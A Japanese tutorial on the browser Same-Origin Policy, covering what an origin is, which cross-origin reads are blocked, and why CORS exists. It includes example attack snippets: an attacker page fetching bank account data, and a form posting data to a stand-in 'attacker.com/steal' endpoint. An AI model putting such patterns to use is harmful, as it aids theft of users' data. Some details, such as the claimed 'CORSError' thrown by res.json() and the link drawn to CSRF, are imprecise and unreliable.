# Same-Origin Policy — ブラウザが異なるサイトを隔離する理由

## 今日のゴール

- オリジン（プロトコル・ドメイン・ポート）が異なるサイト間でリソースを読み込むとき、何が制限されるか知る
- 「別のサイトから POST を送る」「別のサイトの画像を読む」など、操作ごとにルールが違う理由を知る
- CORS が何を解決するのかを理解する基盤を持つ

## オリジンとは

ブラウザは、Web サイトを **オリジン** という単位で管理します。オリジンは 3 つの要素で決まります。

```
プロトコル（http / https）
↓
https://example.com:8080/path/to/page
      ↑                ↑
   ドメイン          ポート番号
```

オリジンが同じとは、この 3 つ**すべて**が一致することです。

```ts
// 実例
// https://example.com と同じオリジン
https://example.com/other/page     // ✓ パスは関係ない

// https://example.com と異なるオリジン
https://example.com:8080/          // ✗ ポート違い
https://subdomain.example.com/     // ✗ ドメイン違い
http://example.com/                // ✗ プロトコル違い
```

## Same-Origin Policy が制限する操作

ブラウザに組み込まれた **Same-Origin Policy（SOP）** は、スクリプトが**異なるオリジンのリソースにアクセス**するのを制限します。ただし、すべての操作が制限されるわけではありません。

| 操作 | 同一オリジン | 異なるオリジン | 注記 |
|-----|-----------|------------|-----|
| ページの読み込み | ✓ | ✓ | `<a>` や `location.href` は制限なし |
| フォームの送信 | ✓ | ✓ | HTML フォーム（POST）も制限なし |
| 画像の読み込み | ✓ | ✓ | `<img src="">` は制限なし |
| スタイルシートの読み込み | ✓ | ✓ | `<link rel="stylesheet">` は制限なし |
| **JavaScript の内容読み取り** | ✓ | ✗ | `fetch()` や `XMLHttpRequest` で異なるオリジンから取得できない |
| **DOM の内容読み取り** | ✓ | ✗ | `<iframe>` の中身を JavaScript から読めない |
| **Cookie の送受信** | ✓ | △ | 異なるオリジンには基本的に送信されない（サードパーティ Cookie） |

ここが重要です。**ページの移動やリソースの読み込みは制限されないが、JavaScript でレスポンスの内容を読み取ることは制限される**のです。

## なぜこの制限があるのか

ブラウザでスクリプトを実行する仕組みを考えてみましょう。

```html
<!-- page.html — https://attacker.com に置かれたページ -->
<script>
  // 別のサイトのデータを盗もうとする
  fetch('https://bank.example.com/api/account')
    .then(res => res.json())
    .then(data => console.log(data));  // 口座情報を読もうとしている
</script>
```

このコードが動くとしたら、誰があなたの銀行サイトにログイン中のブラウザなら、スクリプトはあなたの口座情報を読み取って外部に送信できます。これは **CSRF（Cross-Site Request Forgery）** や **情報盗聴**の温床になります。

Same-Origin Policy があれば、異なるオリジンからの fetch は、サーバーが **CORS（Cross-Origin Resource Sharing）** で明示的に許可しない限り、ブラウザが応答の内容を JavaScript に渡しません。

```javascript
// fetch は成功し、レスポンスは返ってくる
const res = await fetch('https://bank.example.com/api/account');

// しかし JSON を読もうとすると、ブラウザが CORS エラーで ブロック
const data = await res.json();  // ❌ CORSError: Access denied
```

## HTML タグは制限されない理由

`<img>` や `<link>` は異なるオリジンのリソースを読み込めます。なぜでしょう。

答えは **「タグが HTML 標準の一部だから、ブラウザが許可している」** です。Web の初期段階から画像の外部リンクや CDN の CSS 読み込みは当たり前の動作でした。そのため、これらのタグの読み込みは制限していません。

ただし、`<img src="https://example.com/api/secret">` で JavaScript から画像のピクセルデータを `canvas` で読み取ろうとすると、Same-Origin Policy が制限します。「読み込み」と「内容の読み取り」は別の操作だからです。

## フォーム送信が制限されない理由

```html
<form action="https://attacker.com/steal" method="POST">
  <input name="data" value="something">
</form>
```

このフォームを送信しても、ブラウザは JavaScript で応答を読み取れません。「別のサイトへ POST を送ること」は許可されていますが、「その応答を JavaScript で読むこと」は Same-Origin Policy で制限されます。

Web の歴史的背景として、フォームの送信先に制限がないのは、Web 標準が成立した当初、JavaScript が今ほど強力ではなく、非同期通信も AJAX も存在しなかったためです。その時代の仕様が今も維持されています。

## まとめ

- Same-Origin Policy は、**オリジン（プロトコル・ドメイン・ポート）が異なるサイト間のアクセスを制限**
- 制限されるのは「JavaScript で内容を読み取る操作」で、ページ移動やタグの読み込みは制限されない
- この設計により、悪意のあるサイトがユーザーの認証情報や個人情報を盗むのを防いでいる
- CORS は、このルールに対して「サーバーが明示的に許可する仕組み」
